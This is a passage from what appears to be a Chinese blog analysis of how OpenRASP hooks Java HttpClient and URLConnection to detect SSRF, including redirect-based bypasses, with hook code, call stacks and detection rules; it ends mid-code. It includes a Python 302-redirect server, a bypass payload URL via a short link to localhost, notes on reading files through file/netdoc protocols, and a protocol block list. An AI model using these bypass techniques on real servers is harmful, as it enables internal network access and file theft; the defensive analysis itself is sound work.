function_">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">    CtClass[] interfaces = ctClass.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (interfaces != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (CtClass inter : interfaces) &#123;</span><br><span class="line">            <span class="comment">// hook的应用类需要实现HttpClient接口，感觉和isClassMatched方法有重复</span></span><br><span class="line">            <span class="keyword">if</span> (inter.getName().equals(<span class="string">&quot;org.apache.http.client.HttpClient&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">//穷举client类多态的execute方法</span></span><br><span class="line">                LinkedList&lt;CtBehavior&gt; methods =</span><br><span class="line">                    getMethod(ctClass, <span class="string">&quot;execute&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//$1应该表示第一个形参，$_表示方法的返回值</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">afterSrc</span> <span class="operator">=</span> getInvokeStaticSrc(HttpClientHook.class, <span class="string">&quot;exitCheck&quot;</span>,</span><br><span class="line">                                                     <span class="string">&quot;$1,$_&quot;</span>, Object.class, Object.class);</span><br><span class="line">                <span class="comment">//根据多态的execute方法的第一个形参，在excute方法执行前插入checkHttpUri或者checkHttpHost</span></span><br><span class="line">                <span class="keyword">for</span> (CtBehavior method : methods) &#123;</span><br><span class="line">                    <span class="comment">//方法标签：（新参）返回值，其中类名前的L代表对象类型，[代表数组</span></span><br><span class="line">                    <span class="keyword">if</span> (method.getSignature().startsWith(<span class="string">&quot;(Lorg/apache/http/client/methods/HttpUriRequest&quot;</span>)) &#123;</span><br><span class="line">                        <span class="comment">//可以看到，javassist通过$1获取应用类方法的形参</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(HttpClientHook.class,</span><br><span class="line">                                                        <span class="string">&quot;checkHttpUri&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">                        insertBefore(method, src);</span><br><span class="line">                        insertAfter(method, afterSrc, <span class="literal">true</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.getSignature().startsWith(<span class="string">&quot;(Lorg/apache/http/HttpHost&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(HttpClientHook.class,</span><br><span class="line">                                                        <span class="string">&quot;checkHttpHost&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">                        insertBefore(method, src);</span><br><span class="line">                        insertAfter(method, afterSrc, <span class="literal">true</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//checkHttpUri或者checkHttpHost方法</span></span><br><span class="line">isChecking.set(<span class="literal">true</span>);  <span class="comment">//isChecking是ThreadLocal变量</span></span><br><span class="line"><span class="comment">//最终在getSsrfParam获取params</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;url&quot;</span>, url);</span><br><span class="line">params.put(<span class="string">&quot;hostname&quot;</span>, hostname);</span><br><span class="line">params.put(<span class="string">&quot;function&quot;</span>, function);</span><br><span class="line">params.put(<span class="string">&quot;port&quot;</span>, port);</span><br><span class="line">LinkedList&lt;String&gt; ip = getIpList(hostname);</span><br><span class="line">Collections.sort(ip);</span><br><span class="line">params.put(<span class="string">&quot;ip&quot;</span>, ip);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.SSRF, params);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//exitCheck方法</span></span><br><span class="line"><span class="keyword">if</span> (isChecking.get() &amp;&amp; response != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">URI</span> <span class="variable">redirectUri</span> <span class="operator">=</span> HttpClientRedirectHook.uriCache.get();</span><br><span class="line">    <span class="keyword">if</span> (redirectUri != <span class="literal">null</span>) &#123;</span><br><span class="line">        HashMap&lt;String, Object&gt; params = getSsrfParam(uriValue);</span><br><span class="line">        <span class="keyword">if</span> (params != <span class="literal">null</span>) &#123;</span><br><span class="line">            HashMap&lt;String, Object&gt; redirectParams = getSsrfParamFromURI(redirectUri);</span><br><span class="line">            <span class="keyword">if</span> (redirectParams != <span class="literal">null</span>) &#123;</span><br><span class="line">                AbstractRedirectHook.checkHttpClientRedirect(params, redirectParams, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.SSRF_REDIRECT, params);</span><br></pre></td></tr></table></figure><h3 id="URLConnectionHook"><a href="#URLConnectionHook" class="headerlink" title="URLConnectionHook"></a>URLConnectionHook</h3><p>应用类：sun&#x2F;net&#x2F;www&#x2F;protocol&#x2F;http&#x2F;HttpURLConnection、weblogic&#x2F;net&#x2F;http&#x2F;HttpURLConnection</p><p>hook类：URLConnectionHook</p><p>​ 检测代码checkHttpConnection和onExit，分别会被插桩在urlConnection.getInputStream执行前后。checkHttpConnection方法逻辑同上，将url、hostname、function（即参数，requestmapping）、port、ip信息放入params，交给V8检测，并设置isChecking和originCache两个线程缓存。</p><p>​onExit方法，会从URLConnectionRedirectHook.urlCache缓存中取出重定向url，V8检测本次请求url和重定向url相关信息。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//URLConnectionHook类的hookMethod方法</span></span><br><span class="line"><span class="comment">//这里参数$0应该表示this，即该URLConnection实例</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(URLConnectionHook.class, <span class="string">&quot;checkHttpConnection&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;$0&quot;</span>, URLConnection.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, src);</span><br><span class="line">src = getInvokeStaticSrc(URLConnectionHook.class, <span class="string">&quot;onExit&quot;</span>, <span class="string">&quot;$0&quot;</span>, Object.class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, src, <span class="literal">true</span>);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//checkHttpConnection方法</span></span><br><span class="line">isChecking.set(<span class="literal">true</span>);</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> urlConnection.getURL();</span><br><span class="line">HashMap&lt;String, Object&gt; param = getSsrfParamWithURL(url);<span class="comment">//获取的所有信息同HttpClientHook类</span></span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.SSRF, params);</span><br><span class="line">originCache.set(param);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//onExit方法</span></span><br><span class="line"><span class="keyword">if</span> (isChecking.get() &amp;&amp; !isExit.get() &amp;&amp; URLConnectionRedirectHook.urlCache.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 以下会继续调用 getinpustream isExit 避免死循环</span></span><br><span class="line">    isExit.set(<span class="literal">true</span>);</span><br><span class="line">    HashMap&lt;String, Object&gt; cache = originCache.get();</span><br><span class="line">    HashMap&lt;String, Object&gt; redirectCache = getSsrfParamWithURL(URLConnectionRedirectHook.urlCache.get());</span><br><span class="line">    <span class="keyword">if</span> (cache != <span class="literal">null</span> &amp;&amp; redirectCache != <span class="literal">null</span>) &#123;</span><br><span class="line">        AbstractRedirectHook.checkRedirect(cache, redirectCache,</span><br><span class="line">                                           ((HttpURLConnection) urlConnection).getResponseMessage(), ((HttpURLConnection) urlConnection).getResponseCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.SSRF_REDIRECT, params);</span><br></pre></td></tr></table></figure><h3 id="HttpClientRedirectHook（302重定向SSRF）"><a href="#HttpClientRedirectHook（302重定向SSRF）" class="headerlink" title="HttpClientRedirectHook（302重定向SSRF）"></a>HttpClientRedirectHook（302重定向SSRF）</h3><p>应用类：org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;DefaultRedirectStrategy、org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;DefaultRedirectHandler</p><p>hook类：HttpClientRedirectHook</p><p>​在client.execute方法返回前，OpenRASP将检测代码exitCheck插桩到该位置执行，exitCheck方法会先从HttpClientRedirectHook的线程变量uriCache拿到重定向url，再将本次请求url和重定向url交给V8。在当时的测试用例中，response为null导致没有进入这部分检测逻辑，其实这是在检测另一种攻击方式，302重定向SSRF，这里我们对它展开分析。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//模型</span></span><br><span class="line">服务端接口：http:<span class="comment">//192.168.1.3:8083/httpClient</span></span><br><span class="line">重定向服务：python38 302redirect.py <span class="number">8091</span> http:<span class="comment">//127.0.0.1:8090/1.txt </span></span><br><span class="line">攻击目标：python38 -m http.server --bind <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span></span><br><span class="line">payload：http:<span class="comment">//192.168.1.3:8083/httpClient?url=http://mtw.so/5Ct624</span></span><br><span class="line">短链接转换器：相当于存储了key-value：http:<span class="comment">//mtw.so/5Ct624 - http://192.168.1.3:8091</span></span><br></pre></td></tr></table></figure><h4 id="302重定向SSRF"><a href="#302重定向SSRF" class="headerlink" title="302重定向SSRF"></a>302重定向SSRF</h4><p>​302重定向是服务端发起的，浏览器使用者无法控制。很常见的功能是，用户在浏览器登录界面输入用户名和密码正确后，服务端将页面重定向到登陆成功页面。以OpenRASP为例，用户请求 <a href="http://127.0.0.1:8083/httpClient?url=127.0.0.1:8090/1.txt">http://127.0.0.1:8083/httpClient?url=127.0.0.1:8090/1.txt</a> 时，被SSRF检测阻断，这时候服务端返回的response状态码是302，Location字段就是小恐龙页面地址，浏览器会自动解析出该地址，跳转到小恐龙页面。</p><p>​那302重定向如何应用在SSRF呢？</p><p>​因为此时服务端充当了上述模型中浏览器的角色。在HttpClient业务代码中，假设用户请求为 <a href="http://192.168.1.3:8083/httpClient?url=http://mtw.so/5Ct624">http://192.168.1.3:8083/httpClient?url=http://mtw.so/5Ct624</a> ，其中 <a href="http://mtw.so/5Ct624">http://mtw.so/5Ct624</a> 充当302跳转服务。该跳转服务的功能很简单，返回的response是302，Location字段为“ <a href="http://127.0.0.1:8090/1.txt">http://127.0.0.1:8090/1.txt</a> ”。</p><p>​这样HttpClient业务代码中，url为 <a href="http://mtw.so/5Ct624">http://mtw.so/5Ct624</a> 不是内网地址，不会触发SSRF检测，服务端client.execute(url)后获得重定向地址为“ <a href="http://127.0.0.1:8090/1.txt">http://127.0.0.1:8090/1.txt</a> ”，client.execute(url)内部的重定向机制会自动访问该重定向地址，从而绕过HttpClient业务代码中对传参url的过滤。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)-<span class="number">1</span> != <span class="number">2</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Usage: &#123;&#125; &lt;port_number&gt; &lt;url&gt;&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">  sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Redirect</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">    self.send_response(<span class="number">302</span>)</span><br><span class="line">    self.send_header(<span class="string">&#x27;Location&#x27;</span>, sys.argv[<span class="number">2</span>])</span><br><span class="line">    self.end_headers()</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">send_error</span>(<span class="params">self, code, message=<span class="literal">None</span></span>):</span><br><span class="line">    self.send_response(<span class="number">302</span>)</span><br><span class="line">    self.send_header(<span class="string">&#x27;Location&#x27;</span>, sys.argv[<span class="number">2</span>])</span><br><span class="line">    self.end_headers()</span><br><span class="line"></span><br><span class="line">HTTPServer((<span class="string">&quot;&quot;</span>, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])), Redirect).serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="comment"># python38 302redirect.py 8091 http://127.0.0.1:8090/1.txt</span></span><br><span class="line"><span class="comment"># 在本机8091开启重定向服务，对该服务的请求，返回response为302，response头Location字段指向http://127.0.0.1:8090/1.txt</span></span><br></pre></td></tr></table></figure><h4 id="OpenRASP检测重定向"><a href="#OpenRASP检测重定向" class="headerlink" title="OpenRASP检测重定向"></a>OpenRASP检测重定向</h4><p>​OpenRASP对“302重定向SSRF”的检测点，就在client.execute(url)的重定向机制。远程调试上述示例时，观察调用栈如下图，client.execute(url)发现是302重定向时，在重定向逻辑中执行getLocationURI方法，获取重定向地址。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cacheHttpRedirect:<span class="number">54</span>, HttpClientRedirectHook (com.baidu.openrasp.hook.ssrf.redirect)</span><br><span class="line">getLocationURI:<span class="number">197</span>, DefaultRedirectStrategy (org.apache.http.impl.client)</span><br><span class="line">getRedirect:<span class="number">223</span>, DefaultRedirectStrategy (org.apache.http.impl.client)</span><br><span class="line">execute:<span class="number">126</span>, RedirectExec (org.apache.http.impl.execchain)</span><br><span class="line">doExecute:<span class="number">185</span>, InternalHttpClient (org.apache.http.impl.client)</span><br><span class="line">execute:<span class="number">83</span>, CloseableHttpClient (org.apache.http.impl.client)</span><br><span class="line">execute:<span class="number">108</span>, CloseableHttpClient (org.apache.http.impl.client)</span><br><span class="line">execute:<span class="number">56</span>, CloseableHttpClient (org.apache.http.impl.client)</span><br><span class="line">ssrfClient:<span class="number">49</span>, SSRFController (com.bmsk.rasp.controller)</span><br></pre></td></tr></table></figure><p>​OpenRASP中的hook类HttpClientRedirectHook，将检测代码cacheHttpRedirect插入getLocationURI方法返回前，检测逻辑是将getLocationURI的返回值（即重定向地址）缓存在线程变量uriCache。这样逻辑回到client.execute(url)时，该方法返回前会调用hook类HttpClientHook的exitCheck方法，该方法会对本次请求url和重定向url进行检测，从而阻断SSRF。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HttpClientRedirectHook类的hookMethod方法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(HttpClientRedirectHook.class, <span class="string">&quot;cacheHttpRedirect&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;getLocationURI&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//cacheHttpRedirect方法</span></span><br><span class="line"><span class="keyword">if</span> (uri <span class="keyword">instanceof</span> URI) &#123;</span><br><span class="line">    uriCache.set((URI) uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这样，HttpClientRedirectHook实质上，只是在client.execute(url)执行过程中，缓存了重定向url。HttpClientHook则在client.execute(url)执行前对url检测，检测目标是CheckParameter.Type.SSRF；在client.execute(url)执行返回前，再对本次请求url和重定向url进行检测，检测目标是CheckParameter.Type.SSRF_REDIRECT，形成了逻辑闭环。</p><p>​在调试过程中，由于我使用短地址 <a href="http://mtw.so/5Ct624">http://mtw.so/5Ct624</a> ，观察到HttpClient重复了两次302重定向。当然这不重要。简单提一下，短地址服务的原理还是302重定向，它相当于存储了key-value键值对，key为 <a href="http://mtw.so/5Ct624">http://mtw.so/5Ct624</a> ，value为 <a href="http://192.168.1.3:8091/">http://192.168.1.3:8091</a> ，当用户请求前者时，会重定向到后者。使用短地址，是因为我没有公网IP，为了观察OpenRASP的SSRF_REDIRECT检测，不至于被OpenRASP的SSRF检测直接通过内网IP阻断掉。</p><p>​调试过程中的另一点认识，burpsuite抓不到127的包，能抓到192的包，说明其工作在wlan网卡，而不是本地环回网卡。</p><p>​服务端防御“302重定向SSRF”的方式很简单，就是限制不能自动跳转：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(<span class="literal">false</span>).build());</span><br></pre></td></tr></table></figure><h3 id="URLConnectionRedirectHook（302重定向SSRF）"><a href="#URLConnectionRedirectHook（302重定向SSRF）" class="headerlink" title="URLConnectionRedirectHook（302重定向SSRF）"></a>URLConnectionRedirectHook（302重定向SSRF）</h3><p>应用类：sun&#x2F;net&#x2F;www&#x2F;protocol&#x2F;http&#x2F;HttpURLConnection、weblogic&#x2F;net&#x2F;http&#x2F;HttpURLConnection</p><p>hook类：URLConnectionRedirectHook</p><p>​URLConnectionRedirectHook检测逻辑和HttpClientRedirectHook一致，它将监测点插入urlConnection.getInputStream()的重定向机制。重定向机制执行到urlConnection.followRedirect()方法时，会调用检测代码cacheHttpRedirect，在线程变量urlCache中缓存重定向url，配合后续hook类URLConnectionHook的onExit方法，对本次请求url和重定向url进行检测。</p><p>​从调用栈信息也可看到，不管是client.execute(url)，还是urlConnection.getInputStream()，重定向都是在其内部完成，OpenRASP基本也插桩在内部能获取重定向url的位置。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload：http://192.168.1.3:8083/ssrf?url=http://mtw.so/5v1FWr</span></span><br><span class="line">cacheHttpRedirect:<span class="number">39</span>, URLConnectionRedirectHook (com.baidu.openrasp.hook.ssrf.redirect)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect) [<span class="number">2</span>]</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">followRedirect:<span class="number">2647</span>, HttpURLConnection (sun.net.www.protocol.http)</span><br><span class="line">getInputStream0:<span class="number">1830</span>, HttpURLConnection (sun.net.www.protocol.http)</span><br><span class="line">getInputStream:<span class="number">1498</span>, HttpURLConnection (sun.net.www.protocol.http)</span><br><span class="line">ssrf:<span class="number">27</span>, SSRFController (com.bmsk.rasp.controller)</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//URLConnectionRedirectHook类的hookMethod方法</span></span><br><span class="line"><span class="comment">//表示将followRedirect的this（urlConnection）、($w)$_不懂啥意思？传入cacheHttpRedirect</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(URLConnectionRedirectHook.class, <span class="string">&quot;cacheHttpRedirect&quot;</span>,</span><br><span class="line"><span class="string">&quot;$0,($w)$_&quot;</span>, Object.class, Object.class);</span><br><span class="line"><span class="comment">//表示followRedirect是无参数，boolean返回值的方法</span></span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;followRedirect&quot;</span>, <span class="string">&quot;()Z&quot;</span>, src, <span class="literal">false</span>);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//cacheHttpRedirect方法</span></span><br><span class="line"><span class="keyword">if</span> ((Boolean) isRedirect) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        urlCache.set((URL) Reflection.invokeMethod(connection, <span class="string">&quot;getURL&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        <span class="comment">// ignore</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​禁止自动302重定向：conn.setInstanceFollowRedirects(false);</p><h4 id="JVM中原语类型签名"><a href="#JVM中原语类型签名" class="headerlink" title="JVM中原语类型签名"></a>JVM中原语类型签名</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Character     Type          Interpretation</span><br><span class="line">------------------------------------------</span><br><span class="line">B             <span class="type">byte</span>          signed <span class="type">byte</span></span><br><span class="line">C             <span class="type">char</span>          Unicode character</span><br><span class="line">D             <span class="type">double</span>        <span class="type">double</span>-precision floating-point value</span><br><span class="line">F             <span class="type">float</span>         single-precision floating-point value</span><br><span class="line">I             <span class="type">int</span>           integer</span><br><span class="line">J             <span class="type">long</span>          <span class="type">long</span> integer</span><br><span class="line">L&lt;classname&gt;; reference     an instance of class    <span class="comment">//引用类</span></span><br><span class="line">S             <span class="type">short</span>         signed <span class="type">short</span></span><br><span class="line">Z             <span class="type">boolean</span>       <span class="literal">true</span> or <span class="literal">false</span></span><br><span class="line">[             reference     one array dimension<span class="comment">//数组</span></span><br></pre></td></tr></table></figure><p>​疑问：如何将jar放入另一个项目源码中调试，比如IDEA打开OpenRASP项目源码，配置远程调试，此时还希望同时调试SpringBoot项目的源码，是将springboot项目.jar放入OpenRASP项目吗？没有找到合适的方法。是否可以学导入OpenRASP-v8那样，将springboot项目.jar放到mvn路径里。</p><h2 id="Java中SSRF的限制"><a href="#Java中SSRF的限制" class="headerlink" title="Java中SSRF的限制"></a>Java中SSRF的限制</h2><p>​Java中SSRF仅支持 sun.net.<a href="http://www.protocol/">www.protocol</a> 下的所有协议：http、https、file、ftp、mailto、jar和netdoc协议，可以通过file协议或netdoc协议列出目录，读取敏感文件，无回显时可通过ftp协议进行带外读取，可以通过http协议探测端口是否启用，但是，不能通过gopher协议拓展供给面，因为不支持该协议。</p><p>​此外，在“302重定向SSRF”攻击中，要求传入的url协议必须和重定向的url协议一致，重定向url协议也受上述限制。</p><h2 id="SSRF检测算法"><a href="#SSRF检测算法" class="headerlink" title="SSRF检测算法"></a>SSRF检测算法</h2><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SSRF - 来自用户输入，且为内网地址就拦截</span></span><br><span class="line"><span class="attr">ssrf_userinput</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 用户输入匹配算法（支持 rebind 检测）&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// SSRF - 是否允许访问 aws metadata</span></span><br><span class="line"><span class="attr">ssrf_aws</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法2 - 拦截 AWS/Aliyun/GCP metadata 访问&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// SSRF - 是否允许访问 dnslog 地址</span></span><br><span class="line"><span class="attr">ssrf_common</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:    <span class="string">&#x27;算法3 - 拦截常见 dnslog 地址&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:  <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// SSRF - 是否允许访问混淆后的IP地址</span></span><br><span class="line"><span class="attr">ssrf_obfuscate</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法4 - 拦截混淆地址&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;ignore&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// SSRF - 禁止使用 curl 读取 file:///etc/passwd、php://filter/XXXX 这样的内容</span></span><br><span class="line"><span class="attr">ssrf_protocol</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法5 - 拦截 php:// 等异常协议&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    <span class="attr">protocols</span>: [</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gopher&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// python specific</span></span><br><span class="line">        <span class="string">&#x27;local_file&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;local-file&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// java specific</span></span><br><span class="line">        <span class="string">&#x27;jar&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;netdoc&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// php specific</span></span><br><span class="line">        <span class="string">&#x27;dict&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phar&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;compress.zlib&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;compress.bzip2&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_internal_ip</span>(<span class="params">ip, origin_ip</span>) &#123;</span><br><span class="line">    <span class="comment">// origin_ip不为空且全部为内网地址则跳过</span></span><br><span class="line">    <span class="keyword">if</span> (origin_ip &amp;&amp; origin_ip.<span class="title function_">every</span>(<span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> internalRegex.<span class="title function_">test</span>(value)</span><br><span class="line">        &#125;))&#123; <span class="keyword">return</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;ip.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (internalRegex.<span class="title function_">test</span>(ip[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_userinput</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting intranet address: %1%&quot;</span>, [ ip[i] ]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_userinput&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_internal_hostname</span>(<span class="params">hostname, origin_hostname</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((origin_hostname) &amp;&amp; (origin_hostname == <span class="string">&#x27;[::]&#x27;</span> || origin_hostname == <span class="string">&#x27;[::1]&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hostname == <span class="string">&#x27;[::]&#x27;</span> || hostname == <span class="string">&#x27;[::1]&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_userinput</span>.<span class="property">action</span>,</span><br><span class="line">            <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting intranet address: %1%&quot;</span>, [ hostname ]),</span><br><span class="line">            <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">            <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_userinput&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_internal</span>(<span class="params">params, context, is_redirect</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ret</span><br><span class="line">    <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line">    <span class="keyword">if</span> (is_redirect) &#123;</span><br><span class="line">        ret = <span class="title function_">check_internal_ip</span>(params.<span class="property">ip</span>, params.<span class="property">origin_ip</span>)</span><br><span class="line">        <span class="keyword">if</span> (ret &amp;&amp; !whiteHostName.<span class="title function_">test</span>(params.<span class="property">hostname</span>)) &#123;<span class="keyword">return</span> ret&#125;</span><br><span class="line">        ret = <span class="title function_">check_internal_hostname</span>(params.<span class="property">hostname</span>, params.<span class="property">origin_hostname</span>)</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;<span class="keyword">return</span> ret&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">is_from_userinput</span>(all_parameter, params.<span class="property">url</span>)) &#123;</span><br><span class="line">        <span class="comment">// 非重定向，判定用户输入</span></span><br><span class="line">        ret = <span class="title function_">check_internal_ip</span>(params.<span class="property">ip</span>, <span class="literal">undefined</span>)</span><br><span class="line">        <span class="keyword">if</span> (ret &amp;&amp; !whiteHostName.<span class="title function_">test</span>(params.<span class="property">hostname</span>)) &#123;<span 